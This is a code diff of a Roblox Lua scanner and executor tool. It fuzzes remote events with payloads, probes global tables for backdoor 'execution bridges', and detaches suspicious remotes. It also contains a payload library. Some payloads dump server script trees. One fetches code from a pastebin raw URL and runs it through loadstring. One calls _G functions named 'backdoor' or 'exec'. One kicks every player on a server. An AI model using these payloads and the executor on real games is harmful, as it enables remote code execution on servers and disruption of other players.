+        local rd = mkLbl(row, "⬆ +"..riskDelta, 10, T.CRIT, Enum.Font.GothamBold, Enum.TextXAlignment.Right)
+        rd.Size = UDim2.new(0,60,0,14); rd.Position = UDim2.new(1,-64,0,3)
     end
 end
 
 local function runFuzzer()
     if S.isFuzzing then return end
-    if #S.fuzzQueue==0 then log("WARN","Fuzz queue is empty. Add remotes from Scanner first."); return end
-    S.isFuzzing=true
-    FuzzResultList:ClearAllChildren(); ll(FuzzResultList,3)
-    log("FUZZ",("Auto-Fuzzer started — %d remotes · mode: %s"):format(#S.fuzzQueue, currentFuzzMode))
+    if #S.fuzzQueue == 0 then
+        log("WARN","Fuzz queue is empty. Add remotes from Scanner first."); return
+    end
+    S.isFuzzing = true
+    FuzzResultList:ClearAllChildren(); mkList(FuzzResultList, 3)
+    log("FUZZ", ("Auto-Fuzzer started — %d remotes · mode: %s"):format(#S.fuzzQueue, currentFuzzMode))
 
     local payloads = CFG.FUZZ_SETS[currentFuzzMode] or CFG.FUZZ_SETS.QUICK
 
     for _, entry in ipairs(S.fuzzQueue) do
         if not S.isFuzzing then break end
+
         local remote = entry.inst
         if not remote or not remote.Parent then
-            log("WARN","[FUZZ] Remote gone: "..entry.path); goto continue
-        end
+            log("WARN","[FUZZ] Remote gone: "..entry.path)
+        else
+            log("FUZZ","Fuzzing: "..entry.path.." ("..entry.class..")")
 
-        log("FUZZ","Fuzzing: "..entry.path.." ("..entry.class..")")
+            for _, payload in ipairs(payloads) do
+                if not S.isFuzzing then break end
+                task.wait(0.08)
 
-        for _, payload in ipairs(payloads) do
-            if not S.isFuzzing then break end
-            task.wait(0.08) -- small delay to avoid rate limiting
+                local ok, result, riskDelta = false, "", 0
 
-            local ok, result, riskDelta = false, "", 0
+                if remote:IsA("RemoteEvent") then
+                    ok, result = pcall(function() remote:FireServer(payload); return "Fired" end)
+                elseif remote:IsA("RemoteFunction") then
+                    ok, result = pcall(function() return tostring(remote:InvokeServer(payload)) end)
+                end
 
-            if remote:IsA("RemoteEvent") then
-                ok, result = pcall(function()
-                    remote:FireServer(payload)
-                    return "Fired (no return)"
-                end)
-            elseif remote:IsA("RemoteFunction") then
-                ok, result = pcall(function()
-                    return tostring(remote:InvokeServer(payload))
-                end)
+                result = tostring(result)
+
+                if result:find("SS%-FUZZ") or result:find("loadstring") or result:find("executed") then
+                    riskDelta = 35
+                    log("CRIT","[FUZZ] !! Possible execution response from "..entry.path..": "..result:sub(1,80))
+                elseif ok and result ~= "Fired" and result ~= "nil" then
+                    riskDelta = 8
+                end
+
+                entry.fuzzRisk = math.max(entry.fuzzRisk or 0, riskDelta)
+                entry.risk = calcRemoteRisk(entry)
+
+                S.fuzzResults[#S.fuzzResults+1] = {path=entry.path, payload=payload, ok=ok, response=result, riskDelta=riskDelta}
+                addFuzzResult(entry.path, payload, ok, result, riskDelta)
+                log("FUZZ",("[%s] %s → %s"):format(ok and "OK" or "FAIL", entry.path, result:sub(1,60)))
             end
-
-            result = tostring(result)
-
-            -- Heuristic: does the response look like code executed?
-            if result:find("SS%-FUZZ") or result:find("loadstring") or result:find("executed") then
-                riskDelta = 35
-                log("CRIT","[FUZZ] !! Possible execution response from "..entry.path..": "..result:sub(1,80))
-            elseif result:find("error") or result:find("attempt") then
-                riskDelta = 5 -- responded to the string, might be a live handler
-            end
-
-            -- Update entry risk
-            entry.fuzzRisk = math.max(entry.fuzzRisk or 0, riskDelta)
-            entry.risk = calcRemoteRisk(entry)
-
-            S.fuzzResults[#S.fuzzResults+1]={path=entry.path,payload=payload,ok=ok,response=result,riskDelta=riskDelta}
-            addFuzzResult(entry.path, payload, ok, result, riskDelta)
-
-            log("FUZZ",("[%s] %s → %s"):format(ok and "OK" or "FAIL", entry.path, result:sub(1,60)))
         end
-
-        ::continue::
     end
 
     updateStats()
     log("OK",("Fuzzer done — %d results logged"):format(#S.fuzzResults))
-    S.isFuzzing=false
+    S.isFuzzing = false
 end
 
--- G-Bridge probe: checks _G, shared, and (if available) getgenv() for exec functions
 local function probeGBridge()
-    S.gbridgeFinds={}
-    GBridgeList:ClearAllChildren(); ll(GBridgeList,2)
+    S.gbridgeFinds = {}
+    GBridgeList:ClearAllChildren(); mkList(GBridgeList, 2)
     log("FUZZ","G-Bridge probe starting…")
 
-    local tables = { {name="_G", tbl=_G}, {name="shared", tbl=shared} }
-    local ok, genv = pcall(getgenv)
-    if ok and type(genv)=="table" then tables[#tables+1]={name="getgenv()",tbl=genv} end
+    local sources = { {name="_G", tbl=_G}, {name="shared", tbl=shared} }
+    local ok, genv = pcall(function() return getgenv and getgenv() or nil end)
+    if ok and type(genv)=="table" then sources[#sources+1]={name="getgenv()", tbl=genv} end
 
-    local found=0
-    for _, src in ipairs(tables) do
-        if type(src.tbl)~="table" then continue end
-        for k, v in pairs(src.tbl) do
-            local ks = tostring(k):lower()
-            local isExecKey = false
-            for _, bk in ipairs(CFG.GBRIDGE_KEYS) do
-                if ks==bk or ks:find(bk,1,true) then isExecKey=true; break end
-            end
-            if isExecKey or type(v)=="function" and isExecKey then
-                found+=1
-                local entry={key=src.name.."."..tostring(k), valType=type(v), source=src.name}
-                S.gbridgeFinds[#S.gbridgeFinds+1]=entry
+    local found = 0
+    for _, src in ipairs(sources) do
+        if type(src.tbl) == "table" then
+            for k, v in pairs(src.tbl) do
+                local ks = tostring(k):lower()
+                for _, bk in ipairs(CFG.GBRIDGE_KEYS) do
+                    if ks == bk or ks:find(bk, 1, true) then
+                        found += 1
+                        local entry = {key=src.name.."."..tostring(k), valType=type(v)}
+                        S.gbridgeFinds[#S.gbridgeFinds+1] = entry
 
-                local row=Instance.new("Frame"); row.Size=UDim2.new(1,-8,0,22); row.BackgroundColor3=Color3.fromRGB(25,10,40); row.BorderSizePixel=0; row.Parent=GBridgeList; corner(row,3); stroke(row,T.PRP,1)
-                local l=lbl(row,("[%s] %s  =  %s"):format(entry.source,tostring(k),type(v)),11,T.PRP,Enum.Font.Code); l.Size=UDim2.new(1,-8,1,0); l.Position=UDim2.new(0,4,0,0)
-                log("CRIT","[GBRIDGE] "..entry.source.."."..tostring(k).." = "..type(v).." ← POSSIBLE EXECUTION BRIDGE")
+                        local row = Instance.new("Frame")
+                        row.Size = UDim2.new(1,-8,0,22)
+                        row.BackgroundColor3 = Color3.fromRGB(25,10,40)
+                        row.BorderSizePixel = 0
+                        row.Parent = GBridgeList
+                        mkCorner(row, 3); mkStroke(row, T.PRP, 1)
+                        local gl = mkLbl(row, ("[%s] %s = %s"):format(src.name, tostring(k), type(v)), 11, T.PRP, Enum.Font.Code)
+                        gl.Size = UDim2.new(1,-8,1,0); gl.Position = UDim2.new(0,4,0,0)
+                        log("CRIT","[GBRIDGE] "..src.name.."."..tostring(k).." = "..type(v))
+                        break
+                    end
+                end
             end
         end
     end
 
-    statLabels["gbridge"].Text=tostring(found)
-    if found==0 then
-        log("OK","G-Bridge probe: no execution bridges found in _G / shared / getgenv()")
-        local row=Instance.new("Frame"); row.Size=UDim2.new(1,-8,0,22); row.BackgroundColor3=T.BG3; row.BorderSizePixel=0; row.Parent=GBridgeList; corner(row,3)
-        lbl(row,"✅  No execution bridges detected in _G / shared / getgenv()",11,T.OK,Enum.Font.Gotham).Size=UDim2.new(1,-8,1,0)
+    statLabels["gbridge"].Text = tostring(found)
+    if found == 0 then
+        local row = Instance.new("Frame"); row.Size=UDim2.new(1,-8,0,22); row.BackgroundColor3=T.BG3; row.BorderSizePixel=0; row.Parent=GBridgeList; mkCorner(row,3)
+        local gl = mkLbl(row, "✅  No execution bridges found in _G / shared / getgenv()", 11, T.OK, Enum.Font.Gotham)
+        gl.Size = UDim2.new(1,-8,1,0)
+        log("OK","G-Bridge probe: no execution bridges found.")
     else
-        log("CRIT","G-Bridge probe: "..found.." suspicious keys found!")
+        log("CRIT","G-Bridge probe: "..found.." suspicious key(s) found!")
     end
 end
 
--- ════════════════════════════════════════════════════════════════════════
--- §20  FIREWALL LOGIC
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
+-- §20  FIREWALL LOGIC  (global function — called from §18 before definition)
+-- ═══════════════════════════════════════════════════════════════════════
 
 function firewallRemote(entry)
     local rem = entry.inst
-    if not rem or not rem.Parent then log("WARN","Firewall skip — gone: "..(entry.path or "?")); return end
+    if not rem or not rem.Parent then
+        log("WARN","Firewall skip — already gone: "..(entry.path or "?"))
+        return
+    end
     local ok, err = pcall(function()
-        if rem:IsA("RemoteEvent")    then rem.OnServerEvent:Connect(function() end)
-        elseif rem:IsA("RemoteFunction") then rem.OnServerInvoke=function() return nil end end
-        rem.Parent=nil
+        if rem:IsA("RemoteEvent") then
+            rem.OnServerEvent:Connect(function() end)
+        elseif rem:IsA("RemoteFunction") then
+            rem.OnServerInvoke = function() return nil end
+        end
+        rem.Parent = nil
     end)
     if ok then
-        local fw={path=entry.path,class=entry.class,time=ts()}
-        S.firewalled = S.firewalled or {}; S.firewalled[#S.firewalled+1]=fw
+        local fw = {path=entry.path, class=entry.class, time=ts()}
+        S.firewalled[#S.firewalled+1] = fw
         log("OK","Firewalled: "..entry.path)
-        local row=Instance.new("Frame"); row.Size=UDim2.new(1,-8,0,24); row.BackgroundColor3=Color3.fromRGB(14,26,14); row.BorderSizePixel=0; row.Parent=FWList; corner(row,4)
-        local c=lbl(row,"["..fw.class.."]",11,T.OK,Enum.Font.Code); c.Size=UDim2.new(0,115,1,0); c.Position=UDim2.new(0,6,0,0)
-        local p=lbl(row,fw.path,11,T.TXT,Enum.Font.Code); p.Size=UDim2.new(0,355,1,0); p.Position=UDim2.new(0,124,0,0)
-        local t_=lbl(row,fw.time,11,T.TXM,Enum.Font.Code); t_.Size=UDim2.new(0,80,1,0); t_.Position=UDim2.new(0,490,0,0)
+
+        local row = Instance.new("Frame")
+        row.Size = UDim2.new(1,-8,0,24)
+        row.BackgroundColor3 = Color3.fromRGB(14,26,14)
+        row.BorderSizePixel = 0
+        row.Parent = FWList
+        mkCorner(row, 4)
+
+        local fc = mkLbl(row, "["..fw.class.."]", 11, T.OK, Enum.Font.Code); fc.Size=UDim2.new(0,120,1,0); fc.Position=UDim2.new(0,6,0,0)
+        local fp = mkLbl(row, fw.path, 11, T.TXT, Enum.Font.Code); fp.Size=UDim2.new(0,360,1,0); fp.Position=UDim2.new(0,130,0,0)
+        local ft = mkLbl(row, fw.time, 11, T.TXM, Enum.Font.Code); ft.Size=UDim2.new(0,80,1,0); ft.Position=UDim2.new(0,500,0,0)
     else
         log("WARN","Firewall failed "..entry.path..": "..tostring(err))
     end
 end
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §21  EXECUTOR LOGIC
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
-local function pushHist(name, payload, ok, res)
-    local e={ts=ts(),name=name,ok=ok,result=tostring(res)}
-    table.insert(S.execHistory,1,e)
-    while #S.execHistory>CFG.MAX_EXEC_HISTORY do table.remove(S.execHistory) end
-    HistList:ClearAllChildren(); ll(HistList,2); pad(HistList,4,4,4,4)
-    for _,h in ipairs(S.execHistory) do
-        local r=Instance.new("Frame"); r.Size=UDim2.new(1,-8,0,16); r.BackgroundColor3=h.ok and Color3.fromRGB(11,22,12) or Color3.fromRGB(22,11,11); r.BorderSizePixel=0; r.Parent=HistList; corner(r,3)
-        local l=lbl(r,("[%s] %s → %s"):format(h.ts,h.name,h.ok and "OK: "..h.result:sub(1,50) or "FAIL: "..h.result:sub(1,50)),10,h.ok and T.OK or T.CRIT,Enum.Font.Code); l.Size=UDim2.new(1,-8,1,0); l.Position=UDim2.new(0,4,0,0)
+local function pushHistory(name, payload, ok, result)
+    local e = {t=ts(), name=name, ok=ok, result=tostring(result)}
+    table.insert(S.execHistory, 1, e)
+    while #S.execHistory > CFG.MAX_EXEC_HIST do table.remove(S.execHistory) end
+
+    HistList:ClearAllChildren(); mkList(HistList, 2); mkPad(HistList,4,4,4,4)
+    for _, h in ipairs(S.execHistory) do
+        local r = Instance.new("Frame")
+        r.Size = UDim2.new(1,-8,0,16)
+        r.BackgroundColor3 = h.ok and Color3.fromRGB(11,22,12) or Color3.fromRGB(22,11,11)
+        r.BorderSizePixel = 0; r.Parent = HistList; mkCorner(r,3)
+        local rl = mkLbl(r, ("[%s] %s → %s"):format(h.t, h.name, h.ok and "OK: "..h.result:sub(1,50) or "FAIL: "..h.result:sub(1,50)), 10, h.ok and T.OK or T.CRIT, Enum.Font.Code)
+        rl.Size = UDim2.new(1,-8,1,0); rl.Position = UDim2.new(0,4,0,0)
     end
+end
+
+local function resolveRemote()
+    local remote = S.selRemote
+    if remote and remote.Parent then return remote end
+    local path = TargetBox.Text
+    if path == "" then return nil end
+    local parts = path:split(".")
+    local ok2, svc = pcall(function() return game:GetService(parts[1]) end)
+    if not ok2 then return nil end
+    local cur = svc
+    for i = 2, #parts do
+        cur = cur:FindFirstChild(parts[i])
+        if not cur then return nil end
+    end
+    return cur
 end
 
 local function doExecute()
-    local remote = S.selRemote
     local payload = PayloadBox.Text
-    if payload=="" then log("WARN","Payload is empty."); return end
+    if payload == "" then log("WARN","Payload is empty."); return end
+    local remote = resolveRemote()
+    if not remote then log("WARN","No valid target remote."); return end
 
-    if not remote or not remote.Parent then
-        local path=TargetBox.Text; if path=="" then log("WARN","No target remote."); return end
-        local parts=path:split(".")
-        local ok2,svc=pcall(function() return game:GetService(parts[1]) end)
-        if ok2 then local cur=svc; for i=2,#parts do cur=cur:FindFirstChild(parts[i]); if not cur then break end end; remote=cur end
-        if not remote then log("WARN","Cannot resolve: "..path); return end
-    end
-
-    log("EXEC",("Firing [%s] %s on '%s'"):format(S.fireMode,remote.ClassName,remote.Name))
-
+    log("EXEC",("Firing [%s] %s '%s'"):format(S.fireMode, remote.ClassName, remote.Name))
     local ok, res
-    if S.fireMode=="FireServer" and remote:IsA("RemoteEvent") then
-        ok,res=pcall(function() remote:FireServer(payload); return "Fired" end)
-    elseif S.fireMode=="InvokeServer" and remote:IsA("RemoteFunction") then
-        ok,res=pcall(function() return tostring(remote:InvokeServer(payload)) end)
+
+    if S.fireMode == "FireServer" and remote:IsA("RemoteEvent") then
+        ok, res = pcall(function() remote:FireServer(payload); return "Fired" end)
+    elseif S.fireMode == "InvokeServer" and remote:IsA("RemoteFunction") then
+        ok, res = pcall(function() return tostring(remote:InvokeServer(payload)) end)
     else
-        log("WARN","Mode/class mismatch"); ExecResultLabel.TextColor3=T.CRIT; ExecResultLabel.Text="Mode mismatch"; return
+        log("WARN","Mode/class mismatch: "..S.fireMode.." vs "..remote.ClassName)
+        ExecResultLabel.TextColor3 = T.CRIT
+        ExecResultLabel.Text = "Mode mismatch"
+        return
     end
+
     local resultStr = ok and tostring(res) or ("ERROR: "..tostring(res))
-    ExecResultLabel.Text="Last: "..resultStr:sub(1,80); ExecResultLabel.TextColor3=ok and T.OK or T.CRIT
+    ExecResultLabel.Text = "Last: "..resultStr:sub(1,80)
+    ExecResultLabel.TextColor3 = ok and T.OK or T.CRIT
     log(ok and "OK" or "WARN","Result: "..resultStr:sub(1,120))
-    pushHist(remote.Name, payload, ok, resultStr)
+    pushHistory(remote.Name, payload, ok, resultStr)
 end
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §22  PAYLOAD LIBRARY
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
-local PAYLOADS={
+local PAYLOADS = {
     -- DIAGNOSTIC
-    {cat="DIAG",  name="🔔 Ping",             code='print("[SS] ping @ "..tostring(tick()))'},
-    {cat="DIAG",  name="📊 Instance Count",   code='print("[SS] insts: "..#game:GetDescendants())'},
-    {cat="DIAG",  name="🌐 PlaceId + JobId",  code='print("[SS] PlaceId="..game.PlaceId.." Job="..game.JobId)'},
-    {cat="DIAG",  name="⏱ Server Uptime",     code='print("[SS] uptime="..math.floor(workspace.DistributedGameTime).."s")'},
-    {cat="DIAG",  name="👤 LocalPlayer info", code='local p=game.Players.LocalPlayer; print("[SS] "..p.Name.." uid="..p.UserId)'},
-    {cat="DIAG",  name="📋 List Players",     code='for _,p in ipairs(game.Players:GetPlayers()) do print(p.Name,p.UserId) end'},
+    {cat="DIAG", name="🔔 Ping",              code='print("[SS] ping @ "..tostring(tick()))'},
+    {cat="DIAG", name="📊 Instance Count",    code='print("[SS] instances: "..#game:GetDescendants())'},
+    {cat="DIAG", name="🌐 PlaceId + JobId",   code='print("[SS] PlaceId="..game.PlaceId.." Job="..game.JobId)'},
+    {cat="DIAG", name="⏱ Server Uptime",      code='print("[SS] uptime="..math.floor(workspace.DistributedGameTime).."s")'},
+    {cat="DIAG", name="👤 LocalPlayer info",  code='local p=game.Players.LocalPlayer; print("[SS] "..p.Name.." uid="..p.UserId)'},
+    {cat="DIAG", name="📋 List Players",      code='for _,p in ipairs(game.Players:GetPlayers()) do print(p.Name,p.UserId) end'},
     -- RECON
-    {cat="RECON", name="🗺 Workspace Children",     code='for _,c in ipairs(workspace:GetChildren()) do print(c.ClassName,c.Name) end'},
-    {cat="RECON", name="🔍 All Scripts",             code='for _,v in ipairs(game:GetDescendants()) do if v:IsA("Script") or v:IsA("LocalScript") or v:IsA("ModuleScript") then print(v:GetFullName()) end end'},
-    {cat="RECON", name="📡 All RemoteEvents",        code='for _,v in ipairs(game:GetDescendants()) do if v:IsA("RemoteEvent") then print(v:GetFullName()) end end'},
-    {cat="RECON", name="📡 All RemoteFunctions",     code='for _,v in ipairs(game:GetDescendants()) do if v:IsA("RemoteFunction") then print(v:GetFullName()) end end'},
-    {cat="RECON", name="🌍 All StringValues",        code='for _,v in ipairs(game:GetDescendants()) do if v:IsA("StringValue") and #v.Value>0 then print(v:GetFullName(),"=",v.Value:sub(1,60)) end end'},
-    {cat="RECON", name="⚙ SSS Tree",                code='for _,v in ipairs(game:GetService("ServerScriptService"):GetDescendants()) do print(v.ClassName,v:GetFullName()) end'},
-    {cat="RECON", name="💾 ServerStorage Tree",      code='for _,v in ipairs(game:GetService("ServerStorage"):GetDescendants()) do print(v.ClassName,v:GetFullName()) end'},
-    {cat="RECON", name="🔵 ReplicatedStorage Tree",  code='for _,v in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do print(v.ClassName,v:GetFullName()) end'},
+    {cat="RECON", name="🗺 Workspace Kids",    code='for _,c in ipairs(workspace:GetChildren()) do print(c.ClassName,c.Name) end'},
+    {cat="RECON", name="🔍 All Scripts",       code='for _,v in ipairs(game:GetDescendants()) do if v:IsA("Script") or v:IsA("LocalScript") or v:IsA("ModuleScript") then print(v:GetFullName()) end end'},
+    {cat="RECON", name="📡 All RemoteEvents",  code='for _,v in ipairs(game:GetDescendants()) do if v:IsA("RemoteEvent") then print(v:GetFullName()) end end'},
+    {cat="RECON", name="📡 All RemoteFuncs",   code='for _,v in ipairs(game:GetDescendants()) do if v:IsA("RemoteFunction") then print(v:GetFullName()) end end'},
+    {cat="RECON", name="🌍 All StringValues",  code='for _,v in ipairs(game:GetDescendants()) do if v:IsA("StringValue") and #v.Value>0 then print(v:GetFullName(),"=",v.Value:sub(1,60)) end end'},
+    {cat="RECON", name="⚙ SSS Tree",           code='for _,v in ipairs(game:GetService("ServerScriptService"):GetDescendants()) do print(v.ClassName,v:GetFullName()) end'},
+    {cat="RECON", name="💾 ServerStorage Tree", code='for _,v in ipairs(game:GetService("ServerStorage"):GetDescendants()) do print(v.ClassName,v:GetFullName()) end'},
     -- HTTP
     {cat="HTTP",  name="🔑 HTTP Enabled?",     code='local ok,r=pcall(function() return game:GetService("HttpService").HttpEnabled end); print("[SS] HttpEnabled="..tostring(r))'},
-    {cat="HTTP",  name="🌐 HTTP GET test",     code='local ok,r=pcall(function() return game:GetService("HttpService"):GetAsync("https://httpbin.org/get") end); print("[SS] HTTP:",ok,r and r:sub(1,80) or "failed")'},
-    {cat="HTTP",  name="💉 HTTP+loadstring",   code='local ok,src=pcall(function() return game:GetService("HttpService"):GetAsync("https://pastebin.com/raw/REPLACE_ME") end)\nif ok and src then local fn,err=loadstring(src); if fn then pcall(fn) else print("compile err:",err) end else print("fetch fail:",src) end'},
+    {cat="HTTP",  name="🌐 HTTP GET test",      code='local ok,r=pcall(function() return game:GetService("HttpService"):GetAsync("https://httpbin.org/ip") end); print("[SS] HTTP:",ok,r and r:sub(1,60) or "n/a")'},
+    {cat="HTTP",  name="💉 HTTP+loadstring",    code='-- Replace URL with your pastebin raw link\nlocal ok,src=pcall(function()\n  return game:GetService("HttpService"):GetAsync("https://pastebin.com/raw/REPLACE_ME")\nend)\nif ok and src then\n  local fn,err=loadstring(src)\n  if fn then pcall(fn) else print("compile err:",err) end\nelse print("fetch fail:",src) end'},
+    {cat="HTTP",  name="📦 require(AssetID)",   code='-- Replace 0 with actual asset ID\nlocal ok,r=pcall(function() return require(0) end)\nprint("[SS] require:",ok,type(r))'},
     -- RCE
-    {cat="RCE",   name="▶ loadstring eval",    code='local fn,err=loadstring("print(\'[SS] loadstring active @ \'..tostring(tick()))")\nif fn then pcall(fn) else print("disabled:",err) end'},
-    {cat="RCE",   name="📦 require(AssetID)",  code='local ok,r=pcall(function() return require(ASSET_ID_HERE) end); print("[SS] require:",ok,type(r))'},
-    -- GLOBAL PROBES
-    {cat="GLOBAL",name="🕵 Dump _G keys",      code='local n=0; for k,v in pairs(_G) do print("_G",k,type(v)); n+=1 end; print("[SS] _G keys:",n)'},
-    {cat="GLOBAL",name="🕵 Dump shared keys",  code='local n=0; for k,v in pairs(shared) do print("shared",k,type(v)); n+=1 end; print("[SS] shared keys:",n)'},
-    {cat="GLOBAL",name="🕵 getgenv probe",     code='local ok,g=pcall(getgenv); if ok and g then print("[SS] getgenv available, keys:"); for k in pairs(g) do print(" ",k) end else print("[SS] getgenv: N/A") end'},
-    {cat="GLOBAL",name="🕵 _G bridge call",    code='local keys={"exec","run","load","cmd","shell","bd","backdoor"}\nfor _,k in ipairs(keys) do\n  if type(_G[k])=="function" then print("[SS] _G."..k.." IS A FUNCTION — calling it"); pcall(_G[k],"print(\'bridge executed\')"); break end\nend'},
+    {cat="RCE",   name="▶ loadstring eval",    code='local fn,err=loadstring("print(\'[SS] loadstring active @ \'..tostring(tick()))")\nif fn then pcall(fn) else print("[SS] loadstring disabled:",err) end'},
+    -- GLOBAL
+    {cat="GLOBAL", name="🕵 Dump _G keys",     code='local n=0; for k,v in pairs(_G) do print("_G",k,type(v)); n+=1 end; print("[SS] _G keys:",n)'},
+    {cat="GLOBAL", name="🕵 Dump shared keys", code='local n=0; for k,v in pairs(shared) do print("shared",k,type(v)); n+=1 end; print("[SS] shared keys:",n)'},
+    {cat="GLOBAL", name="🕵 getgenv probe",    code='local ok,g=pcall(function() return getgenv and getgenv() or nil end)\nif ok and g then print("[SS] getgenv available"); for k in pairs(g) do print(" ",k) end else print("[SS] getgenv: N/A") end'},
+    {cat="GLOBAL", name="🕵 _G bridge call",   code='local keys={"exec","run","load","cmd","shell","bd","backdoor"}\nfor _,k in ipairs(keys) do\n  if type(_G[k])=="function" then\n    print("[SS] _G."..k.." is a function — calling")\n    pcall(_G[k],"print(\'[SS] bridge called\')")\n    break\n  end\nend'},
     -- EXEC
-    {cat="EXEC",  name="🚨 Kick Self",         code='game.Players.LocalPlayer:Kick("[SS] test kick")'},
-    {cat="EXEC",  name="🚨 Kick All Players",  code='for _,p in ipairs(game.Players:GetPlayers()) do p:Kick("[SS] kick") end'},
+    {cat="EXEC",   name="🚨 Kick Self (test)", code='game.Players.LocalPlayer:Kick("[SS] test kick")'},
+    {cat="EXEC",   name="🚨 Kick All Players", code='for _,p in ipairs(game.Players:GetPlayers()) do p:Kick("[SS] server kick") end'},
 }
 
--- Categorise payloads
-local catOrder={"DIAG","RECON","HTTP","RCE","GLOBAL","EXEC"}
-local catColors={DIAG=T.INFO,RECON=T.OK,HTTP=T.WARN,RCE=T.CRIT,GLOBAL=T.PRP,EXEC=T.BRED}
+local catOrder  = {"DIAG","RECON","HTTP","RCE","GLOBAL","EXEC"}
+local catColors = {DIAG=T.INFO, RECON=T.OK, HTTP=T.WARN, RCE=T.CRIT, GLOBAL=T.PRP, EXEC=T.BRED}
 
 for _, cat in ipairs(catOrder) do
-    -- Category header
-    local catRow=Instance.new("Frame"); catRow.Size=UDim2.new(1,-8,0,20); catRow.BackgroundColor3=T.BG3; catRow.BorderSizePixel=0; catRow.Parent=LibList; corner(catRow,4)
-    local catLbl=lbl(catRow,"── "..cat.." ──",10,catColors[cat] or T.TXM,Enum.Font.GothamBold,Enum.TextXAlignment.Center); catLbl.Size=UDim2.new(1,0,1,0)
+    -- Category header row
+    local catRow = Instance.new("Frame")
+    catRow.Size = UDim2.new(1,-8,0,20)
+    catRow.BackgroundColor3 = T.BG3
+    catRow.BorderSizePixel = 0
+    catRow.Parent = LibList
+    mkCorner(catRow, 4)
+    local catL = mkLbl(catRow, "── "..cat.." ──", 10, catColors[cat] or T.TXM, Enum.Font.GothamBold, Enum.TextXAlignment.Center)
+    catL.Size = UDim2.new(1,0,1,0)
 
     for _, pl in ipairs(PAYLOADS) do
-        if pl.cat~=cat then continue end
-        local b=Instance.new("TextButton"); b.Size=UDim2.new(1,-8,0,26); b.BackgroundColor3=T.BG3; b.TextColor3=T.TXT; b.Font=Enum.Font.Gotham; b.TextSize=11; b.Text=pl.name; b.TextXAlignment=Enum.TextXAlignment.Left; b.AutoButtonColor=false; b.BorderSizePixel=0; b.Parent=LibList; corner(b,4); pad(b,0,0,0,8)
-        b.MouseEnter:Connect(function() TweenService:Create(b,TweenInfo.new(0.1),{BackgroundColor3=T.HOV}):Play() end)
-        b.MouseLeave:Connect(function() TweenService:Create(b,TweenInfo.new(0.1),{BackgroundColor3=T.BG3}):Play() end)
-        b.MouseButton1Click:Connect(function() PayloadBox.Text=pl.code; log("INFO","Loaded: "..pl.name); switchTab("Executor") end)
+        if pl.cat == cat then
+            local pb = Instance.new("TextButton")
+            pb.Size = UDim2.new(1,-8,0,26)
+            pb.BackgroundColor3 = T.BG3
+            pb.TextColor3 = T.TXT
+            pb.Font = Enum.Font.Gotham
+            pb.TextSize = 11
+            pb.Text = pl.name
+            pb.TextXAlignment = Enum.TextXAlignment.Left
+            pb.AutoButtonColor = false
+            pb.BorderSizePixel = 0
+            pb.Parent = LibList
+            mkCorner(pb, 4)
+            mkPad(pb, 0,0,0,8)
+            pb.MouseEnter:Connect(function()
+                TweenService:Create(pb, TweenInfo.new(0.1), {BackgroundColor3=T.HOV}):Play()
+            end)
+            pb.MouseLeave:Connect(function()
+                TweenService:Create(pb, TweenInfo.new(0.1), {BackgroundColor3=T.BG3}):Play()
+            end)
+            local plCode = pl.code
+            local plName = pl.name
+            pb.MouseButton1Click:Connect(function()
+                PayloadBox.Text = plCode
+                log("INFO","Loaded: "..plName)
+                switchTab("Executor")
+            end)
+        end
     end
 end
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §23  LIVE MONITOR
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
 local function startMonitor()
-    for _,c in ipairs(S.monConns) do pcall(function() c:Disconnect() end) end
-    S.monConns={}
+    for _, c in ipairs(S.monConns) do pcall(function() c:Disconnect() end) end
+    S.monConns = {}
     if not CFG.LIVE_MONITOR then return end
     log("SYS","Live monitor started — "..#CFG.SERVICES.." services")
     for _, svcName in ipairs(CFG.SERVICES) do
         local ok, svc = pcall(function() return game:GetService(svcName) end)
         if ok and svc then
-            local c=svc.DescendantAdded:Connect(function(inst)
+            local conn = svc.DescendantAdded:Connect(function(inst)
                 if not CFG.LIVE_MONITOR then return end
                 if inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction") then
-                    local bad,kw=badName(inst.Name)
+                    local bad, kw = isBadName(inst.Name)
                     if bad then
-                        log("CRIT","[MONITOR] NEW suspicious "..inst.ClassName.." '"..inst.Name.."' (kw:'"..tostring(kw).."') @ "..inst:GetFullName())
-                        local entry={inst=inst,svc=svcName,path=inst:GetFullName(),class=inst.ClassName,keyword=kw,fuzzRisk=0}
-                        entry.risk=calcRemoteRisk(entry)
-                        S.remotes[#S.remotes+1]=entry; addRemoteRow(entry); updateStats(); switchTab("Scanner")
+                        log("CRIT","[MONITOR] NEW suspicious "..inst.ClassName.." '"..inst.Name.."' @ "..inst:GetFullName())
+                        local entry = {inst=inst, svc=svcName, path=inst:GetFullName(), class=inst.ClassName, keyword=kw, fuzzRisk=0}
+                        entry.risk = calcRemoteRisk(entry)
+                        S.remotes[#S.remotes+1] = entry
+                        addRemoteRow(entry)
+                        updateStats()
+                        switchTab("Scanner")
                     end
                 end
             end)
-            S.monConns[#S.monConns+1]=c
+            S.monConns[#S.monConns+1] = conn
         end
     end
 end
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §24  BUTTON WIRING
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
 bScan.MouseButton1Click:Connect(function() task.spawn(runDeepScan) end)
-bScanStop.MouseButton1Click:Connect(function() stopScan=true; log("SYS","Scan stopped by user.") end)
+bStop.MouseButton1Click:Connect(function() stopScan=true; log("SYS","Scan stopped.") end)
 bClear.MouseButton1Click:Connect(function()
-    S.remotes={}; S.scripts={}; S.attrFinds={}; S.strvalFinds={}; S.gbridgeFinds={}
-    ResultsList:ClearAllChildren(); ll(ResultsList,3)
+    S.remotes={}; S.scripts={}; S.attrFinds={}; S.strvalFinds={}
+    ResultsList:ClearAllChildren(); mkList(ResultsList,3)
     for k in pairs(statLabels) do statLabels[k].Text="0" end
